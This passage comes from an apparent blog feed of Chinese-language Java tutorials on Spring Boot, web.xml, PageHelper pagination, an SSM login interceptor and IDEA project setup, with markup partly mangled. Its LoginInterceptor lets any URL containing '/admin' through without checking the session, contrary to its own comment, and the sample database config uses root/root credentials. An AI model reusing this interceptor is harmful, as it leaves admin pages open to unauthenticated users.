id="DemoApplication-是一个启动程序。你一个直接选择run它。"><a href="#DemoApplication-是一个启动程序。你一个直接选择run它。" class="headerlink" title="DemoApplication 是一个启动程序。你一个直接选择run它。"></a>DemoApplication 是一个启动程序。你一个直接选择run它。</h4></li><li><h4 id="application-properties-将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。"><a href="#application-properties-将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。" class="headerlink" title="application.properties 将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。"></a>application.properties 将需要的配置往里塞。前面ssm中，我们存放的是数据库配置。</h4></li><li><h4 id="DemoApplicationTests-一个测试程序，可以利用它快速编写测试程序某个功能实现。"><a href="#DemoApplicationTests-一个测试程序，可以利用它快速编写测试程序某个功能实现。" class="headerlink" title="DemoApplicationTests 一个测试程序，可以利用它快速编写测试程序某个功能实现。"></a>DemoApplicationTests 一个测试程序，可以利用它快速编写测试程序某个功能实现。</h4></li><li><h4 id="pom-xml-就不需要解释啦。Maven构建说明文件。"><a href="#pom-xml-就不需要解释啦。Maven构建说明文件。" class="headerlink" title="pom.xml 就不需要解释啦。Maven构建说明文件。"></a>pom.xml 就不需要解释啦。<a href="https://kalifun.top/archives/110" target="_blank" rel="noopener">Maven</a>构建说明文件。</h4></li></ul><h2 id="后续配合案例"><a href="#后续配合案例" class="headerlink" title="后续配合案例"></a>后续配合案例</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAのweb.xml</title>
      <link href="/2019/04/26/javanoweb/"/>
      <url>/2019/04/26/javanoweb/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVAのweb-xml"><a href="#JAVAのweb-xml" class="headerlink" title="JAVAのweb.xml"></a>JAVAのweb.xml</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>要问我web.xml是什么，我也模糊不清。这个大概就是整个项目是一辆车，而web.xml就是这把车钥匙🔑吧，如果没有它或者损坏了它？我们就没有把这个web项目跑起来。所以Web项目中,Web.xml还是很重要的。</p></blockquote><h2 id="1-分解"><a href="#1-分解" class="headerlink" title="1.分解"></a>1.分解</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;         version=&quot;3.1&quot;&gt;  &lt;filter&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;encoding&lt;/param-name&gt;      &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/init-param&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;/filter-mapping&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;      &lt;param-value&gt;classpath:spring/spring-*.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;async-supported&gt;true&lt;/async-supported&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><h3 id="1-1web-app"><a href="#1-1web-app" class="headerlink" title="1.1web-app"></a>1.1web-app</h3><blockquote><p> web-app 是描述文件，里面有的元素是我们对这个项目的定义描述。2.4版本以后无需安装DTD指定元素顺序来写文件。</p></blockquote><h3 id="1-2filter"><a href="#1-2filter" class="headerlink" title="1.2filter"></a>1.2filter</h3><blockquote><p> Filter对用户请求进行预处理，接着将请求交给Servlet进行处理并生成响应，最后Filter再对服务器响应进行后处理。</p></blockquote><h3 id="1-3-servlet"><a href="#1-3-servlet" class="headerlink" title="1.3 servlet"></a>1.3 servlet</h3><blockquote><p> Servlet通常称为服务端小程序，是服务端的程序，用于处理及响应客户的请求。</p></blockquote><h3 id="1-4-servlet-mapping"><a href="#1-4-servlet-mapping" class="headerlink" title="1.4 servlet-mapping"></a>1.4 servlet-mapping</h3><blockquote><p> url-pattern 指的是这个目录下的所以资源都将会到servlet下处理。如果我们修改为*.do则表示复合这样的请求格式都将会被servlet处理。</p></blockquote><h2 id="学习资料列表"><a href="#学习资料列表" class="headerlink" title="学习资料列表"></a>学习资料列表</h2><ul><li><a href="http://www.cnblogs.com/vanl/p/5742501.html" target="_blank" rel="noopener">JavaWeb中filter的详解及应用案例</a></li><li><a href="https://www.cnblogs.com/vanl/p/5737656.html" target="_blank" rel="noopener">web.xml详解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java分页のPageHelper</title>
      <link href="/2019/04/19/java-fen-ye-nopagehelper/"/>
      <url>/2019/04/19/java-fen-ye-nopagehelper/</url>
      
        <content type="html"><![CDATA[<h1 id="Java分页のPageHelper"><a href="#Java分页のPageHelper" class="headerlink" title="Java分页のPageHelper"></a>Java分页のPageHelper</h1><h2 id="为什么选择PageHelper"><a href="#为什么选择PageHelper" class="headerlink" title="为什么选择PageHelper"></a>为什么选择PageHelper</h2><blockquote><p> 一听到分页很多人第一反应利用jQuery不就可以啦，我一开始也是这么想的。但是对于没有学过前端的人来说，真的懒得看前端怎么实现分页功能的。唉，除了懒感觉自己没有别的优点了。 </p><ul><li><h4 id="利用超少代码实现分页功能。"><a href="#利用超少代码实现分页功能。" class="headerlink" title="利用超少代码实现分页功能。"></a>利用超少代码实现分页功能。</h4></li><li><h4 id="快速实现，不需要繁琐的前端知识。"><a href="#快速实现，不需要繁琐的前端知识。" class="headerlink" title="快速实现，不需要繁琐的前端知识。"></a>快速实现，不需要繁琐的前端知识。</h4></li></ul></blockquote><h2 id="PageHelper实现步骤"><a href="#PageHelper实现步骤" class="headerlink" title="PageHelper实现步骤"></a>PageHelper实现步骤</h2><h3 id="1-1-配置pom-xml实现导包"><a href="#1-1-配置pom-xml实现导包" class="headerlink" title="1.1 配置pom.xml实现导包"></a>1.1 配置pom.xml实现导包</h3><pre><code>&lt;dependency&gt;      &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;      &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;      &lt;version&gt;4.1.6&lt;/version&gt;  &lt;/dependency&gt;</code></pre><p> 建议高版本，因为我在低版本时功能无法实现。</p><h3 id="1-2配置mybatis"><a href="#1-2配置mybatis" class="headerlink" title="1.2配置mybatis"></a>1.2配置mybatis</h3><p> 因为我们是针对数据库查询后，进行数据分页。这也算是为什么选择它的原因。</p><pre><code>&lt;!-- 配置SqlSessionFactory对象 --&gt;    &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;        &lt;!-- 注入数据库连接池 --&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;        &lt;!-- 扫描entity包 使用别名 --&gt;        &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.label.entity&quot;/&gt;        &lt;!-- 扫描sql配置文件:mapper需要的xml文件 --&gt;        &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;/&gt;        &lt;!--设置PageHelper--&gt;        &lt;property name=&quot;plugins&quot;&gt;            &lt;array&gt;                &lt;bean class=&quot;com.github.pagehelper.PageHelper&quot;&gt;                    &lt;property name=&quot;properties&quot;&gt;                        &lt;value&gt;                          &lt;!-- 还有其他设置，可以自己去看文档根据自己需求进行设置--&gt;                            dialect=mysql                        &lt;/value&gt;                    &lt;/property&gt;                &lt;/bean&gt;            &lt;/array&gt;        &lt;/property&gt;    &lt;/bean&gt;</code></pre><h3 id="1-3SSM代码"><a href="#1-3SSM代码" class="headerlink" title="1.3SSM代码"></a>1.3SSM代码</h3><p> controller与前端交互</p><blockquote><p> controller片段代码</p><pre><code>public ModelAndView fonTable(Page page){        ModelAndView mav = new ModelAndView(&quot;admin/test&quot;);        int total = pictureService.getTotal();        System.out.println(&quot;Total&gt;&gt;&gt;&gt;&quot;+total);        page.calculateEnd(total);        if (page.getStart() &lt; 0) {            page.setStart(0);        }else if (page.getStart() &gt; total) {            page.setEnd(page.getEnd());        }        PageHelper.offsetPage(page.getStart(),16);        List&lt;PictureDate&gt; allPic = pictureService.listPic();        for (int i = 0;i &lt; allPic.size();i++) {            System.out.println(allPic.get(i));        }        System.out.println(allPic);        mav.addObject(&quot;allpic&quot;,allPic);        return mav;    }</code></pre><p> 前端片段代码</p><pre><code></code></pre></blockquote><li class="am-disabled"><a href="?start=0">«</a></li><li class="am-active"><a href="?start=${page.getStart()-page.getCount()}">上一页</a></li><li><a href="?start=${page.getStart()+page.getCount()}">下一页</a></li><li><a href="?start=${page.getEnd()}">»</a></li>``` 其实很多代码都省略了，比如entity，dao，service，mapper相关的代码我都省略了。 立一个flag，写一个平台出一个详细的文章进行学习。]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-ssm框架の拦截器</title>
      <link href="/2019/04/19/java-ssm-kuang-jia-nolan-jie-qi/"/>
      <url>/2019/04/19/java-ssm-kuang-jia-nolan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-ssm框架の拦截器"><a href="#Java-ssm框架の拦截器" class="headerlink" title="Java-ssm框架の拦截器"></a>Java-ssm框架の拦截器</h1><h2 id="为什么使用拦截器？"><a href="#为什么使用拦截器？" class="headerlink" title="为什么使用拦截器？"></a>为什么使用拦截器？</h2><blockquote><p>之前我一直再考虑是不是每次访问页面的时候都需要去考虑有没有存在session，再判断是否可以访问页面？其实差不多，拦截器就是干这个事情的，但是不需要你每次去做判断，只需要把你的拦截器写好，其他的就不用管了。</p></blockquote><h2 id="如何使用拦截器？"><a href="#如何使用拦截器？" class="headerlink" title="如何使用拦截器？"></a>如何使用拦截器？</h2><h3 id="1-1配置XML"><a href="#1-1配置XML" class="headerlink" title="1.1配置XML"></a>1.1配置XML</h3><pre><code>&lt;!-- 拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;!-- 多个拦截器，顺序执行 --&gt;        &lt;mvc:interceptor&gt;            &lt;mvc:mapping path=&quot;/**&quot;/&gt;            &lt;!--不拦截静态资源--&gt;            &lt;mvc:exclude-mapping path=&quot;/*.css&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.css&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.js&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.png&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.gif&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.jpg&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/**/*.jpeg&quot;/&gt;            &lt;mvc:exclude-mapping path=&quot;/label_ctl/*&quot; /&gt;            &lt;!--自定义拦截器--&gt;            &lt;bean class=&quot;com.label.interceptor.LoginInterceptor&quot; /&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><h4 id="设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。"><a href="#设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。" class="headerlink" title="设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。"></a>设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。</h4><blockquote><p> 完整XML文件spring-mvc.xml</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd       http://www.springframework.org/schema/mvc       http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd&quot;&gt;    &lt;context:component-scan base-package=&quot;com.label.controller&quot; /&gt;</code></pre></blockquote><pre><code>&lt;mvc:annotation-driven /&gt;&lt;!--指定文件夹下所有文件不会被DispatcherServlet拦截，直接访问--&gt;&lt;mvc:resources mapping=&quot;/文件夹名称/**&quot; location=&quot;/文件夹名称/&quot;/&gt;&lt;!-- 拦截器 --&gt;&lt;mvc:interceptors&gt;    &lt;!-- 多个拦截器，顺序执行 --&gt;    &lt;mvc:interceptor&gt;        &lt;mvc:mapping path=&quot;/**&quot;/&gt;        &lt;!--不拦截静态资源--&gt;        &lt;mvc:exclude-mapping path=&quot;/*.css&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.css&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.js&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.png&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.gif&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.jpg&quot;/&gt;        &lt;mvc:exclude-mapping path=&quot;/**/*.jpeg&quot;/&gt;        &lt;bean class=&quot;com.label.interceptor.LoginInterceptor&quot; /&gt;    &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt;&lt;mvc:default-servlet-handler /&gt;  &lt;!--指定服务view的文件夹及后缀名--&gt;&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot; /&gt;       &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;&lt;/bean&gt;</code></pre>```### 1.2 自定义拦截器 根据上面设置的目录下创建实例LoginInterceptor```package com.label.interceptor;<p>import com.label.entity.User;<br>import org.springframework.web.servlet.HandlerInterceptor;<br>import org.springframework.web.servlet.ModelAndView;</p><p>import javax.servlet.http.HttpServletRequest;<br>import javax.servlet.http.HttpServletResponse;<br>import javax.servlet.http.HttpSession;</p><p>public class LoginInterceptor implements HandlerInterceptor {<br>    /**<br>     * Handler执行完成之后调用这个方法<br>     */<br>    public void afterCompletion(HttpServletRequest request,<br>                                HttpServletResponse response, Object handler, Exception exc)<br>            throws Exception {</p><pre><code>}/** * Handler执行之后，ModelAndView返回之前调用这个方法 */public void postHandle(HttpServletRequest request, HttpServletResponse response,                       Object handler, ModelAndView modelAndView) throws Exception {}/** * Handler执行之前调用这个方法 */public boolean preHandle(HttpServletRequest request, HttpServletResponse response,                         Object handler) throws Exception {    //获取请求的URL    String url = request.getRequestURI();    //URL:login.jsp是公开的;这个demo是除了login.jsp是可以公开访问的，其它的URL都进行拦截控制    if(url.indexOf(&quot;/admin&quot;)&gt;=0){        return true;    }    //获取Session    HttpSession session = request.getSession();    User user = (User) session.getAttribute(&quot;user&quot;);    if(user != null){        return true;    }    //不符合条件的，跳转到登录界面    request.getRequestDispatcher(&quot;/WEB-INF/views/admin/login.jsp&quot;).forward(request, response);    return false;}</code></pre><p>}</p><p>```<br>对于写后台的来说，上面基本是可以直接使用的。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA 简单创建SSM框架</title>
      <link href="/2019/04/08/idea-jian-dan-chuang-jian-ssm-kuang-jia/"/>
      <url>/2019/04/08/idea-jian-dan-chuang-jian-ssm-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="IDEA-简单创建SSM框架"><a href="#IDEA-简单创建SSM框架" class="headerlink" title="IDEA 简单创建SSM框架"></a>IDEA 简单创建SSM框架</h1><h2 id="SSM框架"><a href="#SSM框架" class="headerlink" title="SSM框架"></a>SSM框架</h2><blockquote><p> S:Spring框架  S:Spring-MVC  M:Mybatis</p></blockquote><h3 id="Spring框架"><a href="#Spring框架" class="headerlink" title="Spring框架"></a>Spring框架</h3><p>Spring 是一个轻量级的 DI / IoC 和 AOP 容器的开源框架。<br><img src="https://image.kalifun.top/upload/1904/b1df24e660b0706a.jpeg" alt="![](https://image.kalifun.top/upload/1904/b1df24e660b0706a.jpeg)"></p><h3 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring-MVC"></a>Spring-MVC</h3><p> 你可以理解Spring-MVC是Spring的一个模块。而MVC则是一种处理模式。现在很多框架都采用这种模式。<br> M：model是数据交互层。V：views是视图层。C：Controller是业务逻辑层。<br><img src="https://image.kalifun.top/upload/1904/2da1900edb713e3b.jpeg" alt="![](https://image.kalifun.top/upload/1904/2da1900edb713e3b.jpeg)"></p><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p> 在我们传统的 JDBC 中，我们除了需要自己提供 SQL 外，还必须操作 Connection、Statment、ResultSet，不仅如此，为了访问不同的表，不同字段的数据，我们需要些很多雷同模板化的代码，闲的繁琐又枯燥。</p><h2 id="1-Maven创建项目"><a href="#1-Maven创建项目" class="headerlink" title="1.Maven创建项目"></a>1.Maven创建项目</h2><p> 注意：</p><ul><li><p>已经安装jdk,maven(使用IDEA自带应该也是可以的)</p><h3 id="1-1创建步骤"><a href="#1-1创建步骤" class="headerlink" title="1.1创建步骤"></a>1.1创建步骤</h3><p><img src="https://image.kalifun.top/upload/1904/23ef84aa9eba8d01.png" alt="![](https://image.kalifun.top/upload/1904/23ef84aa9eba8d01.png)"><br>建议选择1吧。<br><img src="https://image.kalifun.top/upload/1904/7613f966a0034e59.png" alt="![](https://image.kalifun.top/upload/1904/7613f966a0034e59.png)"><br><img src="https://image.kalifun.top/upload/1904/7ed744f109877b82.png" alt="![7ed744f109877b82.png](https://image.kalifun.top/upload/1904/7ed744f109877b82.png)"><br><img src="https://image.kalifun.top/upload/1904/e71140fd484f9479.png" alt="![e71140fd484f9479.png](https://image.kalifun.top/upload/1904/e71140fd484f9479.png)"><br><img src="https://image.kalifun.top/upload/1904/e1f7c4a6f0d70052.png" alt="![e1f7c4a6f0d70052.png](https://image.kalifun.top/upload/1904/e1f7c4a6f0d70052.png)"><br>当出现了上面的字眼，就说明已经创建成功了。</p><h2 id="2-构造项目"><a href="#2-构造项目" class="headerlink" title="2.构造项目"></a>2.构造项目</h2><h3 id="2-1项目架构"><a href="#2-1项目架构" class="headerlink" title="2.1项目架构"></a>2.1项目架构</h3><p>先把项目按照图的架构来作准备。<br><img src="https://image.kalifun.top/upload/1904/879a384754458f38.png" alt="![879a384754458f38.png](https://image.kalifun.top/upload/1904/879a384754458f38.png)"></p><h3 id="2-2修改pom-xml"><a href="#2-2修改pom-xml" class="headerlink" title="2.2修改pom.xml"></a>2.2修改pom.xml</h3><p>```</p><?xml version="1.0" encoding="UTF-8"?><p>&lt;!–<br>Licensed to the Apache Software Foundation (ASF) under one<br>or more contributor license agreements.  See the NOTICE file<br>distributed with this work for additional information<br>regarding copyright ownership.  The ASF licenses this file<br>to you under the Apache License, Version 2.0 (the<br>“License”); you may not use this file except in compliance<br>with the License.  You may obtain a copy of the License at</p><p> <a href="http://www.apache.org/licenses/LICENSE-2.0" target="_blank" rel="noopener">http://www.apache.org/licenses/LICENSE-2.0</a></p><p>Unless required by applicable law or agreed to in writing,<br>software distributed under the License is distributed on an<br>“AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<br>KIND, either express or implied.  See the License for the<br>specific language governing permissions and limitations<br>under the License.</p></li><li><p>-&gt;</p><!-- $Id: pom.xml 642118 2008-03-28 08:04:16Z reinhard $ --><project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"><p> <modelversion>4.0.0</modelversion><br> <packaging>war</packaging></p><p> <name>ssmdemo</name><br> <groupid>ssmdemo</groupid><br> <artifactid>ssmdemo</artifactid><br> <version>1.0-SNAPSHOT</version></p> <build>   <plugins>     <plugin>       <groupid>org.mortbay.jetty</groupid>       <artifactid>maven-jetty-plugin</artifactid>       <version>6.1.7</version>       <configuration>         <connectors>           <connector implementation="org.mortbay.jetty.nio.SelectChannelConnector">             <port>8888</port>             <maxidletime>30000</maxidletime>           </connector>         </connectors>         <webappsourcedirectory>${project.build.directory}/${pom.artifactId}-${pom.version}</webappsourcedirectory>         <contextpath>/</contextpath>       </configuration>     </plugin>   </plugins> </build> <properties>   <!-- 设置项目编码编码 -->   <project.build.sourceencoding>UTF-8</project.build.sourceencoding>   <project.reporting.outputencoding>UTF-8</project.reporting.outputencoding>   <!-- spring版本号 -->   <spring.version>4.3.5.RELEASE</spring.version>   <!-- mybatis版本号 -->   <mybatis.version>3.4.1</mybatis.version> </properties> <dependencies>   <!--dependency>     <groupId>ssmdemo</groupId>     <artifactId>[the artifact id of the block to be mounted]</artifactId>     <version>1.0-SNAPSHOT</version>   </dependency-->   <!-- java ee -->   <dependency>     <groupid>javax</groupid>     <artifactid>javaee-api</artifactid>     <version>7.0</version>   </dependency>   <!-- 单元测试 -->   <dependency>     <groupid>junit</groupid>     <artifactid>junit</artifactid>     <version>4.12</version>   </dependency>   <!-- 实现slf4j接口并整合 -->   <dependency>     <groupid>ch.qos.logback</groupid>     <artifactid>logback-classic</artifactid>     <version>1.2.2</version>   </dependency>   <!-- JSON -->   <dependency>     <groupid>com.fasterxml.jackson.core</groupid>     <artifactid>jackson-databind</artifactid>     <version>2.8.7</version>   </dependency></dependencies></project></li></ul><pre><code>&lt;!-- 数据库 --&gt;&lt;dependency&gt;  &lt;groupId&gt;mysql&lt;/groupId&gt;  &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;  &lt;version&gt;5.1.41&lt;/version&gt;  &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;!-- 数据库连接池 --&gt;&lt;dependency&gt;  &lt;groupId&gt;com.mchange&lt;/groupId&gt;  &lt;artifactId&gt;c3p0&lt;/artifactId&gt;  &lt;version&gt;0.9.5.2&lt;/version&gt;&lt;/dependency&gt;&lt;!-- MyBatis --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  &lt;version&gt;${mybatis.version}&lt;/version&gt;&lt;/dependency&gt;&lt;!-- mybatis/spring整合包 --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;  &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- Spring --&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-core&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-context&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-web&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;org.springframework&lt;/groupId&gt;  &lt;artifactId&gt;spring-test&lt;/artifactId&gt;  &lt;version&gt;${spring.version}&lt;/version&gt;&lt;/dependency&gt;</code></pre>  ``` 修改完成后将会自动下载jar包。### 2.3修改web.xml配置 DispatcherServlet ，告诉程序去哪里寻找对应的xml文件。```<?xml version="1.0" encoding="UTF-8"?><web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"><pre><code>&lt;!-- 编码过滤器 --&gt;&lt;filter&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;encoding&lt;/param-name&gt;        &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;!-- 配置DispatcherServlet --&gt;&lt;servlet&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;!-- 配置springMVC需要加载的配置文件--&gt;    &lt;init-param&gt;        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;        &lt;param-value&gt;classpath:spring-*.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;    &lt;servlet-name&gt;SpringMVC&lt;/servlet-name&gt;    &lt;!-- 匹配所有请求 --&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;</code></pre></web-app>```### 2.4创建jdbc.properties 在resources目录下创建jdbc.properties```jdbc.driver=com.mysql.jdbc.Driver#数据库地址jdbc.url=jdbc:mysql://localhost:3306/ssm?useUnicode=true&characterEncoding=utf8#用户名jdbc.username=root#密码jdbc.password=root#最大连接数c3p0.maxPoolSize=30#最小连接数c3p0.minPoolSize=10#关闭连接后不自动commitc3p0.autoCommitOnClose=false#获取连接超时时间c3p0.checkoutTimeout=10000#当获取连接失败重试次数c3p0.acquireRetryAttempts=2```### 2.5创建spring-mybatis.xml 在resource目录下创建spring-mybatis.xml```<?xml version="1.0" encoding="UTF-8"?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemalocation="http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"><pre><code>&lt;!-- 扫描service包下所有使用注解的类型 --&gt;&lt;context:component-scan base-package=&quot;com.ssmdeom.service&quot;/&gt;&lt;!-- 配置数据库相关参数properties的属性：${url} --&gt;&lt;context:property-placeholder location=&quot;classpath:jdbc.properties&quot;/&gt;&lt;!-- 数据库连接池 --&gt;&lt;bean id=&quot;dataSource&quot; class=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt;    &lt;property name=&quot;driverClass&quot; value=&quot;${jdbc.driver}&quot;/&gt;    &lt;property name=&quot;jdbcUrl&quot; value=&quot;${jdbc.url}&quot;/&gt;    &lt;property name=&quot;user&quot; value=&quot;${jdbc.username}&quot;/&gt;    &lt;property name=&quot;password&quot; value=&quot;${jdbc.password}&quot;/&gt;    &lt;property name=&quot;maxPoolSize&quot; value=&quot;${c3p0.maxPoolSize}&quot;/&gt;    &lt;property name=&quot;minPoolSize&quot; value=&quot;${c3p0.minPoolSize}&quot;/&gt;    &lt;property name=&quot;autoCommitOnClose&quot; value=&quot;${c3p0.autoCommitOnClose}&quot;/&gt;    &lt;property name=&quot;checkoutTimeout&quot; value=&quot;${c3p0.checkoutTimeout}&quot;/&gt;    &lt;property name=&quot;acquireRetryAttempts&quot; 